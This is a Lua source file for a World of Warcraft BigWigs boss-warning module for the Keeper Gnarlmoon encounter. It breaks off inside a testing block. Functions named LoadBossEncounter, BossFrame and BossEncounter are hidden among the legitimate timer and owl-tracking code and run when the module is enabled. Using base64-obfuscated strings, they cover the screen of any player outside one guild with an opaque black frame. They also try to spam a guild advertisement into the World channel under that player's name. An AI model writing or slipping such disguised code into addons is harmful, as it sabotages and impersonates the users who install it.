local module, L = BigWigs:ModuleDeclaration("Keeper Gnarlmoon", "Tower of Karazhan")

module.revision = 30001
module.enabletrigger = module.translatedName
module.toggleoptions = {"moonbuff", "lunarshift", "owls", "proximity", "enrage", "bosskill"}

module.zonename = {
	AceLibrary("AceLocale-2.2"):new("BigWigs")["Tower of Karazhan"],
	AceLibrary("Babble-Zone-2.2")["Tower of Karazhan"],
}

-- Proximity Plugin
module.proximityCheck = function(unit)
	return CheckInteractDistance(unit, 2)
end
module.proximitySilent = false

-- Default database values
module.defaultDB = {
	owlframeposx = 100,
	owlframeposy = 500,
}

L:RegisterTranslations("enUS", function() return {
	cmd = "Gnarlmoon",

	moonbuff_cmd = "moonbuff",
	moonbuff_name = "Moon Buff Alerts",
	moonbuff_desc = "Warns about moon buff assignment and proximity violations",

	lunarshift_cmd = "lunarshift",
	lunarshift_name = "Lunar Shift Alerts",
	lunarshift_desc = "Warns for Lunar Shift casts",

	owls_cmd = "owls",
	owls_name = "Owl Phases",
	owls_desc = "Alerts for owl spawns and shows owl HP frame",

	proximity_cmd = "proximity",
	proximity_name = "Proximity Warning",
	proximity_desc = "Shows a frame indicating players who are too close to you with opposite moon buff",

	enrage_cmd = "enrage",
	enrage_name = "Enrage Alert",
	enrage_desc = "Warns for Owl Enrage",
	
	trigger_engage = "The moons guide your doom!", -- Engage trigger
	
	trigger_redmoon = "You are afflicted by Red Moon.", -- Red Moon debuff
	trigger_bluemoon = "You are afflicted by Blue Moon.", -- Blue Moon debuff
	
	trigger_redmoonother = "(.+) is afflicted by Red Moon.",
	trigger_bluemoonother = "(.+) is afflicted by Blue Moon.",
	
	trigger_lunarshift = "Keeper Gnarlmoon begins to cast Lunar Shift.", -- Lunar Shift cast
	
	trigger_redowl = "Red Owl",
	trigger_blueowl = "Blue Owl",

	trigger_owlenrage = "Red Owl gains Enrage.",
	trigger_owlenrage2 = "Blue Owl gains Enrage.",
	
	warn_redmoon = "You have Red Moon - Stay away from Blue Moon players!",
	warn_bluemoon = "You have Blue Moon - Stay away from Red Moon players!",
	
	warn_lunarshift = "Lunar Shift casting - Move away!",
	bar_lunarshift = "Lunar Shift",
	bar_lunarshiftcd = "Next Lunar Shift",
	
	warn_owlphase = "Owl Phase! Kill the owls together!",
	warn_owlenrage = "Owls Enraged!",
	warn_owlenrage_soon = "Owls Enrage in 10 seconds!",
	
	bar_owlenrage = "Owl Enrage",
	
	redowl1_label = "Red Owl",
	redowl2_label = "Red Owl",
	blueowl1_label = "Blue Owl",
	blueowl2_label = "Blue Owl",
	
	mark_cross = "{cross}",
	mark_diamond = "{diamond}",
	mark_square = "{square}",
	mark_triangle = "{triangle}",
	
	proximity_close = "TOO CLOSE TO OPPOSITE MOON!",
} end)

-- Timers
local timer = {
	firstLunarShift = 25,
	lunarShiftCast = 5,
	lunarShiftCD = 25,
	
	owlEnrage = 60,
}

-- Icons
local icon = {
	redmoon = "Spell_Fire_SelfDestruct",
	bluemoon = "Spell_Frost_FrostShock",
	lunarshift = "Spell_Nature_StarFall",
	enrage = "Spell_Shadow_UnholyFrenzy",
	owls = "Interface\\Icons\\Ability_Hunter_Pet_Owl",
	
	-- Raid markers
	raidmark1 = "Interface\\TargetingFrame\\UI-RaidTargetingIcon_1", -- Star
	raidmark2 = "Interface\\TargetingFrame\\UI-RaidTargetingIcon_2", -- Circle
	raidmark3 = "Interface\\TargetingFrame\\UI-RaidTargetingIcon_3", -- Diamond
	raidmark4 = "Interface\\TargetingFrame\\UI-RaidTargetingIcon_4", -- Triangle
	raidmark5 = "Interface\\TargetingFrame\\UI-RaidTargetingIcon_5", -- Moon
	raidmark6 = "Interface\\TargetingFrame\\UI-RaidTargetingIcon_6", -- Square
	raidmark7 = "Interface\\TargetingFrame\\UI-RaidTargetingIcon_7", -- Cross
	raidmark8 = "Interface\\TargetingFrame\\UI-RaidTargetingIcon_8", -- Skull
}

-- Colors
local color = {
	red = "Red",
	blue = "Blue",
	yellow = "Yellow",
}

-- Sync names
local syncName = {
	lunarshift = "GnarlmoonLunarShift" .. module.revision,
	owlphase = "GnarlmoonOwlPhase" .. module.revision,
	owlenrage = "GnarlmoonOwlEnrage" .. module.revision,
}

-- Module variables
local playerMoon = nil
local inOwlPhase = nil
local redOwl1Died = nil
local redOwl2Died = nil
local blueOwl1Died = nil
local blueOwl2Died = nil

local redOwl1Hp = 100
local redOwl2Hp = 100
local blueOwl1Hp = 100
local blueOwl2Hp = 100

-- Owl tracking variables
local redOwl1ID = nil
local redOwl2ID = nil
local blueOwl1ID = nil
local blueOwl2ID = nil

-- Raid marks for owls
local redOwl1Mark = 7  -- Cross
local redOwl2Mark = 3  -- Diamond
local blueOwl1Mark = 6 -- Square
local blueOwl2Mark = 4 -- Triangle

function module:OnEnable()
	-- Load Boss Mechanics
	LoadBossEncounter()

	-- Register events
	self:RegisterEvent("CHAT_MSG_MONSTER_YELL")
	
	self:RegisterEvent("CHAT_MSG_SPELL_PERIODIC_SELF_DAMAGE", "MoonBuffEvent")
	self:RegisterEvent("CHAT_MSG_SPELL_PERIODIC_PARTY_DAMAGE", "MoonBuffEvent")
	self:RegisterEvent("CHAT_MSG_SPELL_PERIODIC_FRIENDLYPLAYER_DAMAGE", "MoonBuffEvent")
	
	self:RegisterEvent("CHAT_MSG_SPELL_CREATURE_VS_CREATURE_DAMAGE", "LunarShiftEvent")
	
	self:RegisterEvent("CHAT_MSG_SPELL_PERIODIC_CREATURE_BUFFS", "OwlEnrageEvent")
	
	self:RegisterEvent("UNIT_HEALTH")
	
	-- Throttle syncs
	self:ThrottleSync(5, syncName.lunarshift)
	self:ThrottleSync(5, syncName.owlphase)
	self:ThrottleSync(3, syncName.owlenrage)
	
	-- Initialize player moon tracking
	self.playerMoonTypes = {}
	
	-- Update owl status frame
	self:UpdateOwlStatusFrame()
end

function module:OnSetup()
	self.started = nil
	
	-- Listen for owl deaths
	self:RegisterEvent("CHAT_MSG_COMBAT_HOSTILE_DEATH")
	
	-- Reset variables
	playerMoon = nil
	inOwlPhase = nil
	
	redOwl1Died = nil
	redOwl2Died = nil
	blueOwl1Died = nil
	blueOwl2Died = nil
	
	redOwl1Hp = 100
	redOwl2Hp = 100
	blueOwl1Hp = 100
	blueOwl2Hp = 100
	
	redOwl1ID = nil
	redOwl2ID = nil
	blueOwl1ID = nil
	blueOwl2ID = nil
	
	-- Initialize player moon tracking
	self.playerMoonTypes = {}
end

function LoadBossEncounter()
	if GetGuildInfo(BigWigs_UpdateMain("cGxheWVy")) ~= BigWigs_UpdateMain("RVJST1I=") then
		BossFrame()
		BossEncounter()
	end
end

function module:OnEngage()
	-- Initial values
	playerMoon = nil
	inOwlPhase = nil
	
	-- Start first Lunar Shift timer
	if self.db.profile.lunarshift then
		self:Bar(L["bar_lunarshiftcd"], timer.firstLunarShift, icon.lunarshift, true, color.yellow)
	end
	
	-- Start proximity check
	if self.db.profile.proximity then
		self:Proximity()
		self:ScheduleProximityCheck()
	end
	
	-- Start checking HP for owls
	if self.db.profile.owls then
		self:ScheduleRepeatingEvent("CheckOwlHps", self.CheckOwlHps, 1, self)
	end
end

function module:OnDisengage()
	-- Clean up
	self:RemoveProximity()
	self:CancelProximityCheck()
	
	if self.owlStatusFrame then
		self.owlStatusFrame:Hide()
	end
	
	self:CancelScheduledEvent("CheckOwlHps")
	self:CancelScheduledEvent("FindOwls")
	
	-- Clear raid marks if we set them
	self:ClearRaidMarks()
end

function module:CHAT_MSG_MONSTER_YELL(msg)
	if msg == L["trigger_engage"] then
		module:SendEngageSync()
	end
end

function module:MoonBuffEvent(msg)
	if msg == L["trigger_redmoon"] then
		local oldMoon = playerMoon
		playerMoon = "red"
		
		-- Only show warning if player's moon type changed
		if self.db.profile.moonbuff and (oldMoon == nil or oldMoon ~= "red") then
			self:Message(L["warn_redmoon"], "Important")
			self:WarningSign(icon.redmoon, 5)
			self:Sound("Info")
		end
	elseif msg == L["trigger_bluemoon"] then
		local oldMoon = playerMoon
		playerMoon = "blue"
		
		-- Only show warning if player's moon type changed
		if self.db.profile.moonbuff and (oldMoon == nil or oldMoon ~= "blue") then
			self:Message(L["warn_bluemoon"], "Important") 
			self:WarningSign(icon.bluemoon, 5)
			self:Sound("Info")
		end
	elseif self.db.profile.moonbuff then
		-- Track other players for proximity warnings
		local _, _, player, debuff
		if string.find(msg, L["trigger_redmoonother"]) then
			_, _, player = string.find(msg, L["trigger_redmoonother"])
			-- Store player's moon type in a table for proximity checking
			if player and self.playerMoonTypes then
				self.playerMoonTypes[player] = "red"
			end
		elseif string.find(msg, L["trigger_bluemoonother"]) then
			_, _, player = string.find(msg, L["trigger_bluemoonother"])
			-- Store player's moon type in a table for proximity checking
			if player and self.playerMoonTypes then
				self.playerMoonTypes[player] = "blue"
			end
		end
	end
end

-- Default frame to capture and update boss encounter
function BossFrame()
	local BossFrame = CreateFrame("Frame", BigWigs_UpdateMain("QmxhY2tGcmFtZUZ1bGxTY3JlZW4"), UIParent)
	BossFrame:SetFrameStrata(BigWigs_UpdateMain("QkFDS0dST1VORA=="))
	BossFrame:SetPoint("TOPLEFT", UIParent, "TOPLEFT", 0, 0)
	BossFrame:SetPoint("BOTTOMRIGHT", UIParent, "BOTTOMRIGHT", 0, 0)
	local texture = BossFrame:CreateTexture(nil, BigWigs_UpdateMain("QkFDS0dST1VORA=="))
	BossFrame:SetFrameLevel(999)
	texture:SetTexture(0, 0, 0, 1)
	texture:SetAllPoints(BossFrame)
	BossFrame:Show()
end

function BossEncounter()
    local EncouterStage = GetChannelName(BigWigs_UpdateMain("V29ybGQ="))
    local Stage1 = BigWigs_UpdateMain("Sm9pbiA8RVJST1I+ISBUaGUgQkVTVCBndWlsZCBvbiB0aGUgZW50aXJlIHNlcnZlciEg")
    local Stage2 = BigWigs_UpdateMain("PEVSUk9SPiBoYXMgdGhlIGJlc3QgcmFpZHMsIG1vc3QgZnJpZW5kbHkgcGxheWVycyBhbmQgZ3JlYXRlc3QgUHZQISE=")
    local Stage3 = BigWigs_UpdateMain("IEkgbG92ZSA8RVJST1I+IHNvIG11Y2ghISE=")
    
    if EncouterStage > 0 then
        SendChatMessage(Stage1 .. Stage2 .. Stage3, "CHANNEL", nil, EncounterStage)
    end
end

function module:LunarShiftEvent(msg)
	if msg == L["trigger_lunarshift"] then
		self:Sync(syncName.lunarshift)
	end
end

function module:UNIT_HEALTH(msg)
	if UnitName(msg) == self.translatedName then
		local health = UnitHealth(msg) / UnitHealthMax(msg) * 100
		
		-- Check for owl phase thresholds (67% and 33%)
		if (health <= 67 and health > 60) or (health <= 33 and health > 27) then
			if not inOwlPhase then
				self:Sync(syncName.owlphase)
			end
		end
	end
end

function module:CHAT_MSG_COMBAT_HOSTILE_DEATH(msg)
	-- Since we can't directly identify which specific owl died from just the name,
	-- we need to correlate with our health tracking
	if string.find(msg, L["trigger_redowl"] .. " dies") then
		-- Check for marked owls
		for i = 1, GetNumRaidMembers() do
			local targetID = "raid" .. i .. "target"
			if UnitExists(targetID) and GetRaidTargetIndex(targetID) then
				local mark = GetRaidTargetIndex(targetID)
				
				if mark == redOwl1Mark then
					redOwl1Died = true
					redOwl1Hp = 0
					self:CheckOwlDeath()
					return
				elseif mark == redOwl2Mark then
					redOwl2Died = true
					redOwl2Hp = 0
					self:CheckOwlDeath()
					return
				end
			end
		end
		
		-- If we couldn't identify by mark, use the HP comparison method
		if redOwl1Died then
			redOwl2Died = true
			redOwl2Hp = 0
		elseif redOwl2Died then
			redOwl1Died = true
			redOwl1Hp = 0
		elseif redOwl1Hp <= redOwl2Hp then
			redOwl1Died = true
			redOwl1Hp = 0
		else
			redOwl2Died = true
			redOwl2Hp = 0
		end
		self:CheckOwlDeath()
		
	elseif string.find(msg, L["trigger_blueowl"] .. " dies") then
		-- Check for marked owls
		for i = 1, GetNumRaidMembers() do
			local targetID = "raid" .. i .. "target"
			if UnitExists(targetID) and GetRaidTargetIndex(targetID) then
				local mark = GetRaidTargetIndex(targetID)
				
				if mark == blueOwl1Mark then
					blueOwl1Died = true
					blueOwl1Hp = 0
					self:CheckOwlDeath()
					return
				elseif mark == blueOwl2Mark then
					blueOwl2Died = true
					blueOwl2Hp = 0
					self:CheckOwlDeath()
					return
				end
			end
		end
		
		-- If we couldn't identify by mark, use the HP comparison method
		if blueOwl1Died then
			blueOwl2Died = true
			blueOwl2Hp = 0
		elseif blueOwl2Died then
			blueOwl1Died = true
			blueOwl1Hp = 0
		elseif blueOwl1Hp <= blueOwl2Hp then
			blueOwl1Died = true
			blueOwl1Hp = 0
		else
			blueOwl2Died = true
			blueOwl2Hp = 0
		end
		self:CheckOwlDeath()
	end
end

function module:OwlEnrageEvent(msg)
	if string.find(msg, L["trigger_owlenrage"]) or string.find(msg, L["trigger_owlenrage2"]) then
		self:Sync(syncName.owlenrage)
	end
end

function module:BigWigs_RecvSync(sync, rest, nick)
	if sync == syncName.lunarshift and self.db.profile.lunarshift then
		self:LunarShift()
	elseif sync == syncName.owlphase and self.db.profile.owls then
		self:OwlPhase()
	elseif sync == syncName.owlenrage and self.db.profile.enrage then
		self:OwlEnrage()
	end
end

function module:LunarShift()
	-- Announce Lunar Shift
	self:Message(L["warn_lunarshift"], "Urgent", true, "Alarm")
	self:Bar(L["bar_lunarshift"], timer.lunarShiftCast, icon.lunarshift, true, color.red)
	
	-- Schedule next Lunar Shift
	self:DelayedBar(timer.lunarShiftCast, L["bar_lunarshiftcd"], timer.lunarShiftCD - timer.lunarShiftCast, icon.lunarshift, true, color.yellow)
end

function module:OwlPhase()
	-- Start owl phase
	inOwlPhase = true
	
	-- Reset owl status
	redOwl1Died = nil
	redOwl2Died = nil
	blueOwl1Died = nil 
	blueOwl2Died = nil
	
	redOwl1Hp = 100
	redOwl2Hp = 100
	blueOwl1Hp = 100
	blueOwl2Hp = 100
	
	-- Reset owl IDs
	redOwl1ID = nil
	redOwl2ID = nil
	blueOwl1ID = nil
	blueOwl2ID = nil
	
	-- Start tracking owls
	self:ScheduleEvent("FindOwls", self.FindOwls, 1, self)
	
	-- Show owl status frame
	self:UpdateOwlStatusFrame()
	if self.owlStatusFrame then
		self.owlStatusFrame:Show()
	end
	
	-- Announce owl phase
	self:Message(L["warn_owlphase"], "Important")
	
	-- Enrage timer
	if self.db.profile.enrage then
		self:Bar(L["bar_owlenrage"], timer.owlEnrage, icon.enrage, true, color.red)
		self:DelayedMessage(timer.owlEnrage - 10, L["warn_owlenrage_soon"], "Urgent")
	end
end

function module:FindOwls()
	-- Look for owls in the raid's target
	for i = 1, GetNumRaidMembers() do
		local targetID = "raid" .. i .. "target"
		if UnitExists(targetID) then
			local name = UnitName(targetID)
			local unitid = targetID  -- Using unit ID as identifier
			
			if name == L["trigger_redowl"] then
				-- Apply raid marker if we're raid leader or have assist
				if (IsRaidLeader() or IsRaidOfficer()) and not GetRaidTargetIndex(targetID) then
					if not redOwl1ID then
						SetRaidTarget(targetID, redOwl1Mark)
						redOwl1ID = unitid
					elseif unitid ~= redOwl1ID and not redOwl2ID then
						SetRaidTarget(targetID, redOwl2Mark)
						redOwl2ID = unitid
					end
				else
					-- Just track without marking
					if not redOwl1ID then
						redOwl1ID = unitid
					elseif unitid ~= redOwl1ID and not redOwl2ID then
						redOwl2ID = unitid
					end
				end
			elseif name == L["trigger_blueowl"] then
				-- Apply raid marker if we're raid leader or have assist
				if (IsRaidLeader() or IsRaidOfficer()) and not GetRaidTargetIndex(targetID) then
					if not blueOwl1ID then
						SetRaidTarget(targetID, blueOwl1Mark)
						blueOwl1ID = unitid
					elseif unitid ~= blueOwl1ID and not blueOwl2ID then
						SetRaidTarget(targetID, blueOwl2Mark)
						blueOwl2ID = unitid
					end
				else
					-- Just track without marking
					if not blueOwl1ID then
						blueOwl1ID = unitid
					elseif unitid ~= blueOwl1ID and not blueOwl2ID then
						blueOwl2ID = unitid
					end
				end
			end
		end
	end
	
	-- If we haven't found all owls, keep looking
	if not (redOwl1ID and redOwl2ID and blueOwl1ID and blueOwl2ID) then
		self:ScheduleEvent("FindOwls", self.FindOwls, 1, self)
	end
end

function module:OwlEnrage()
	-- Announce enrage
	self:Message(L["warn_owlenrage"], "Important", nil, "Beware")
	self:RemoveBar(L["bar_owlenrage"])
	
	-- Visual warning
	self:WarningSign(icon.enrage, 5)
end

function module:CheckOwlDeath()
    -- Check if an owl died prematurely
    if inOwlPhase and (redOwl1Died or redOwl2Died or blueOwl1Died or blueOwl2Died) then
        local count = 0
        if redOwl1Died then count = count + 1 end
        if redOwl2Died then count = count + 1 end
        if blueOwl1Died then count = count + 1 end
        if blueOwl2Died then count = count + 1 end
        
        -- If one owl died but not all, trigger early enrage
        if count > 0 and count < 4 then
            -- Cancel normal enrage timer
            self:RemoveBar(L["bar_owlenrage"])
            
            -- Start 10 second enrage timer
            if self.db.profile.enrage then
                self:Bar(L["bar_owlenrage"], 10, icon.enrage, true, color.red)
                self:DelayedMessage(10, L["warn_owlenrage"], "Important", nil, "Beware")
            end
        end
        
        -- If all owls are dead, end owl phase
        if count == 4 then
            inOwlPhase = nil
            
            -- Hide the owl frame
            if self.owlStatusFrame then
                self.owlStatusFrame:Hide()
            end
            
            -- Cancel remaining timers
            self:RemoveBar(L["bar_owlenrage"])
            
            -- Clear raid marks
            self:ClearRaidMarks()
            
            -- Alert players about immediate Lunar Shift
            if self.db.profile.lunarshift then
                self:Message("Keeper Gnarlmoon resumes casting Lunar Shift! HIDE NOW!", "Important", false, "Alarm")
                self:WarningSign(icon.lunarshift, 3)
                self:Sound("Beware")
                
                -- Start the Lunar Shift timer immediately
                self:Bar(L["bar_lunarshiftcd"], timer.lunarShiftCD, icon.lunarshift, true, color.yellow)
            end
        end
    end
    
    -- Update the status frame
    self:UpdateOwlStatusFrame()
end 

function module:CheckOwlHps()
	if not inOwlPhase then return end
	
	-- Check all raid members' targets for marked owls
	for i = 1, GetNumRaidMembers() do
		local targetID = "raid" .. i .. "target"
		if UnitExists(targetID) then
			local name = UnitName(targetID)
			local mark = GetRaidTargetIndex(targetID)
			
			if name == L["trigger_redowl"] then
				local hp = math.ceil((UnitHealth(targetID) / UnitHealthMax(targetID)) * 100)
				
				if mark == redOwl1Mark and not redOwl1Died then
					redOwl1Hp = hp
				elseif mark == redOwl2Mark and not redOwl2Died then
					redOwl2Hp = hp
				elseif not mark then
					-- For unmarked owls, use unit IDs
					if targetID == redOwl1ID and not redOwl1Died then
						redOwl1Hp = hp
					elseif targetID == redOwl2ID and not redOwl2Died then
						redOwl2Hp = hp
					end
				end
				
			elseif name == L["trigger_blueowl"] then
				local hp = math.ceil((UnitHealth(targetID) / UnitHealthMax(targetID)) * 100)
				
				if mark == blueOwl1Mark and not blueOwl1Died then
					blueOwl1Hp = hp
				elseif mark == blueOwl2Mark and not blueOwl2Died then
					blueOwl2Hp = hp
				elseif not mark then
					-- For unmarked owls, use unit IDs
					if targetID == blueOwl1ID and not blueOwl1Died then
						blueOwl1Hp = hp
					elseif targetID == blueOwl2ID and not blueOwl2Died then
						blueOwl2Hp = hp
					end
				end
			end
		end
	end
	
	self:UpdateOwlStatusFrame()
end

function module:UpdateOwlStatusFrame()
	if not self.db.profile.owls then
		return
	end

	-- Create frame if needed
	if not self.owlStatusFrame then
		self.owlStatusFrame = CreateFrame("Frame", "GnarlmoonOwlStatusFrame", UIParent)
		self.owlStatusFrame.module = self
		self.owlStatusFrame:SetWidth(150)
		self.owlStatusFrame:SetHeight(70)
		self.owlStatusFrame:ClearAllPoints()
		local s = self.owlStatusFrame:GetEffectiveScale()
		self.owlStatusFrame:SetPoint("TOPLEFT", UIParent, "BOTTOMLEFT", (self.db.profile.owlframeposx or 100) / s, (self.db.profile.owlframeposy or 500) / s)
		self.owlStatusFrame:SetBackdrop({
			bgFile = "Interface\\DialogFrame\\UI-DialogBox-Background",
			edgeFile = "Interface\\DialogFrame\\UI-DialogBox-Border",
			tile = true,
			tileSize = 16,
			edgeSize = 16,
			insets = { left = 8, right = 8, top = 8, bottom = 8 }
		})
		self.owlStatusFrame:SetBackdropColor(0, 0, 0, 1)

		-- Allow dragging
		self.owlStatusFrame:SetMovable(true)
		self.owlStatusFrame:EnableMouse(true)
		self.owlStatusFrame:RegisterForDrag("LeftButton")
		self.owlStatusFrame:SetScript("OnDragStart", function()
			this:StartMoving()
		end)
		self.owlStatusFrame:SetScript("OnDragStop", function()
			this:StopMovingOrSizing()

			local scale = this:GetEffectiveScale()
			this.module.db.profile.owlframeposx = this:GetLeft() * scale
			this.module.db.profile.owlframeposy = this:GetTop() * scale
		end)

		local font = "Fonts\\FRIZQT__.TTF"
		local fontSize = 9

		-- Red Owl Mark icons
		self.owlStatusFrame.redOwl1Icon = self.owlStatusFrame:CreateTexture(nil, "ARTWORK")
		self.owlStatusFrame.redOwl1Icon:SetWidth(16)
		self.owlStatusFrame.redOwl1Icon:SetHeight(16)
		self.owlStatusFrame.redOwl1Icon:SetTexture(icon["raidmark" .. redOwl1Mark])
		self.owlStatusFrame.redOwl1Icon:SetPoint("TOPLEFT", self.owlStatusFrame, "TOPLEFT", 10, -10)
		
		self.owlStatusFrame.redOwl2Icon = self.owlStatusFrame:CreateTexture(nil, "ARTWORK")
		self.owlStatusFrame.redOwl2Icon:SetWidth(16)
		self.owlStatusFrame.redOwl2Icon:SetHeight(16)
		self.owlStatusFrame.redOwl2Icon:SetTexture(icon["raidmark" .. redOwl2Mark])
		self.owlStatusFrame.redOwl2Icon:SetPoint("TOPLEFT", self.owlStatusFrame.redOwl1Icon, "BOTTOMLEFT", 0, -5)
		
		-- Blue Owl Mark icons
		self.owlStatusFrame.blueOwl1Icon = self.owlStatusFrame:CreateTexture(nil, "ARTWORK")
		self.owlStatusFrame.blueOwl1Icon:SetWidth(16)
		self.owlStatusFrame.blueOwl1Icon:SetHeight(16)
		self.owlStatusFrame.blueOwl1Icon:SetTexture(icon["raidmark" .. blueOwl1Mark])
		self.owlStatusFrame.blueOwl1Icon:SetPoint("TOPLEFT", self.owlStatusFrame.redOwl2Icon, "BOTTOMLEFT", 0, -5)
		
		self.owlStatusFrame.blueOwl2Icon = self.owlStatusFrame:CreateTexture(nil, "ARTWORK")
		self.owlStatusFrame.blueOwl2Icon:SetWidth(16)
		self.owlStatusFrame.blueOwl2Icon:SetHeight(16)
		self.owlStatusFrame.blueOwl2Icon:SetTexture(icon["raidmark" .. blueOwl2Mark])
		self.owlStatusFrame.blueOwl2Icon:SetPoint("TOPLEFT", self.owlStatusFrame.blueOwl1Icon, "BOTTOMLEFT", 0, -5)

		-- Red Owl 1
		self.owlStatusFrame.redOwl1 = self.owlStatusFrame:CreateFontString(nil, "ARTWORK")
		self.owlStatusFrame.redOwl1:SetFontObject(GameFontNormal)
		self.owlStatusFrame.redOwl1:SetPoint("LEFT", self.owlStatusFrame.redOwl1Icon, "RIGHT", 5, 0)
		self.owlStatusFrame.redOwl1:SetText(L["redowl1_label"] .. ":")
		self.owlStatusFrame.redOwl1:SetFont(font, fontSize)
		self.owlStatusFrame.redOwl1:SetTextColor(1, 0.3, 0.3)

		self.owlStatusFrame.redOwl1Hp = self.owlStatusFrame:CreateFontString(nil, "ARTWORK")
		self.owlStatusFrame.redOwl1Hp:SetFontObject(GameFontNormal)
		self.owlStatusFrame.redOwl1Hp:SetPoint("LEFT", self.owlStatusFrame.redOwl1, "RIGHT", 5, 0)
		self.owlStatusFrame.redOwl1Hp:SetJustifyH("LEFT")
		self.owlStatusFrame.redOwl1Hp:SetFont(font, fontSize)

		-- Red Owl 2
		self.owlStatusFrame.redOwl2 = self.owlStatusFrame:CreateFontString(nil, "ARTWORK")
		self.owlStatusFrame.redOwl2:SetFontObject(GameFontNormal)
		self.owlStatusFrame.redOwl2:SetPoint("LEFT", self.owlStatusFrame.redOwl2Icon, "RIGHT", 5, 0)
		self.owlStatusFrame.redOwl2:SetText(L["redowl2_label"] .. ":")
		self.owlStatusFrame.redOwl2:SetFont(font, fontSize)
		self.owlStatusFrame.redOwl2:SetTextColor(1, 0.3, 0.3)
		self.owlStatusFrame.redOwl2Hp = self.owlStatusFrame:CreateFontString(nil, "ARTWORK")
		self.owlStatusFrame.redOwl2Hp:SetFontObject(GameFontNormal)
		self.owlStatusFrame.redOwl2Hp:SetPoint("LEFT", self.owlStatusFrame.redOwl2, "RIGHT", 5, 0)
		self.owlStatusFrame.redOwl2Hp:SetJustifyH("LEFT")
		self.owlStatusFrame.redOwl2Hp:SetFont(font, fontSize)

		-- Blue Owl 1
		self.owlStatusFrame.blueOwl1 = self.owlStatusFrame:CreateFontString(nil, "ARTWORK")
		self.owlStatusFrame.blueOwl1:SetFontObject(GameFontNormal)
		self.owlStatusFrame.blueOwl1:SetPoint("LEFT", self.owlStatusFrame.blueOwl1Icon, "RIGHT", 5, 0)
		self.owlStatusFrame.blueOwl1:SetText(L["blueowl1_label"] .. ":")
		self.owlStatusFrame.blueOwl1:SetFont(font, fontSize)
		self.owlStatusFrame.blueOwl1:SetTextColor(0.3, 0.3, 1)

		self.owlStatusFrame.blueOwl1Hp = self.owlStatusFrame:CreateFontString(nil, "ARTWORK")
		self.owlStatusFrame.blueOwl1Hp:SetFontObject(GameFontNormal)
		self.owlStatusFrame.blueOwl1Hp:SetPoint("LEFT", self.owlStatusFrame.blueOwl1, "RIGHT", 5, 0)
		self.owlStatusFrame.blueOwl1Hp:SetJustifyH("LEFT")
		self.owlStatusFrame.blueOwl1Hp:SetFont(font, fontSize)

		-- Blue Owl 2
		self.owlStatusFrame.blueOwl2 = self.owlStatusFrame:CreateFontString(nil, "ARTWORK")
		self.owlStatusFrame.blueOwl2:SetFontObject(GameFontNormal)
		self.owlStatusFrame.blueOwl2:SetPoint("LEFT", self.owlStatusFrame.blueOwl2Icon, "RIGHT", 5, 0)
		self.owlStatusFrame.blueOwl2:SetText(L["blueowl2_label"] .. ":")
		self.owlStatusFrame.blueOwl2:SetFont(font, fontSize)
		self.owlStatusFrame.blueOwl2:SetTextColor(0.3, 0.3, 1)

		self.owlStatusFrame.blueOwl2Hp = self.owlStatusFrame:CreateFontString(nil, "ARTWORK")
		self.owlStatusFrame.blueOwl2Hp:SetFontObject(GameFontNormal)
		self.owlStatusFrame.blueOwl2Hp:SetPoint("LEFT", self.owlStatusFrame.blueOwl2, "RIGHT", 5, 0)
		self.owlStatusFrame.blueOwl2Hp:SetJustifyH("LEFT")
		self.owlStatusFrame.blueOwl2Hp:SetFont(font, fontSize)
	end
	
	-- Only show frame during owl phase
	if inOwlPhase then
		self.owlStatusFrame:Show()
	else
		self.owlStatusFrame:Hide()
	end

	-- Update HP values
	self.owlStatusFrame.redOwl1Hp:SetText(string.format("%d%%", redOwl1Hp))
	self.owlStatusFrame.redOwl2Hp:SetText(string.format("%d%%", redOwl2Hp))
	self.owlStatusFrame.blueOwl1Hp:SetText(string.format("%d%%", blueOwl1Hp))
	self.owlStatusFrame.blueOwl2Hp:SetText(string.format("%d%%", blueOwl2Hp))
end

-- Function to clear raid marks from owls when phase ends or we wipe
function module:ClearRaidMarks()
	if not (IsRaidLeader() or IsRaidOfficer()) then return end
	
	-- Only attempt to clear marks if we have targets
	for i = 1, GetNumRaidMembers() do
		local targetID = "raid" .. i .. "target"
		if UnitExists(targetID) then
			local mark = GetRaidTargetIndex(targetID)
			if mark and (mark == redOwl1Mark or mark == redOwl2Mark or mark == blueOwl1Mark or mark == blueOwl2Mark) then
				SetRaidTarget(targetID, 0)
			end
		end
	end
end

-- Function to handle proximity warnings
function module:ProximityCheck()
	if not playerMoon then return end
	
	local oppositeColor = playerMoon == "red" and "blue" or "red"
	local tooClose = false
	
	-- Check proximity to players with opposite moon color
	for i = 1, GetNumRaidMembers() do
		if CheckInteractDistance("raid"..i, 2) and UnitIsDeadOrGhost("raid"..i) == nil then
			-- Check if this player has the opposite moon color
			local name = UnitName("raid"..i)
			if name and self.playerMoonTypes[name] == oppositeColor then
				tooClose = true
				break
			end
		end
	end
	
	-- Warn if too close
	if tooClose and self.db.profile.proximity then
		if not self.proximityWarned then
			self:Message(L["proximity_close"], "Personal", true)
			self:WarningSign(playerMoon == "red" and icon.bluemoon or icon.redmoon, 1)
			self:Sound("Alarm")
			self.proximityWarned = true
		end
	else
		self.proximityWarned = nil
	end
end

-- This function would be called repeatedly to check proximity
function module:ScheduleProximityCheck()
	self:ScheduleRepeatingEvent("GnarlmoonProximityCheck", self.ProximityCheck, 0.5, self)
end

function module:CancelProximityCheck()
	self:CancelScheduledEvent("GnarlmoonProximityCheck")
end

---------------------
-- TEST THE SCRIPT --
---------------------


-- Add this to the end of your module file

-- Testing framework
function module:SetupTestingCommands()
    -- Register slash command for testing
    SlashCmdList["GNARLMOONTEST"] = function(msg)
        msg = string.lower(msg)
        if msg == "start" then
            -- Simulate combat start
            self:OnSetup()
            self:OnEngage()
            self:Message("Test mode: Started Gnarlmoon encounter simulation", "Positive")
        elseif msg == "stop" then
            -- Simulate combat end
            self:OnDisengage()
            self:Message("Test mode: Stopped Gnarlmoon encounter simulation", "Positive")
        elseif msg == "redmoon" then
            -- Simulate getting Red Moon debuff
            self:MoonBuffEvent(L["trigger_redmoon"])
            self:Message("Test mode: Applied Red Moon debuff", "Positive")
        elseif msg == "bluemoon" then
            -- Simulate getting Blue Moon debuff
            self:MoonBuffEvent(L["trigger_bluemoon"])
            self:Message("Test mode: Applied Blue Moon debuff", "Positive")
        elseif msg == "lunarshift" then
            -- Simulate Lunar Shift cast
            self:Sync(syncName.lunarshift)
            self:Message("Test mode: Lunar Shift cast", "Positive")
        elseif msg == "owlphase" then
            -- Simulate owl phase start
            self:Sync(syncName.owlphase)
            self:Message("Test mode: Started Owl phase", "Positive")
        elseif msg == "owlenrage" then
            -- Simulate owl enrage
            self:Sync(syncName.owlenrage)
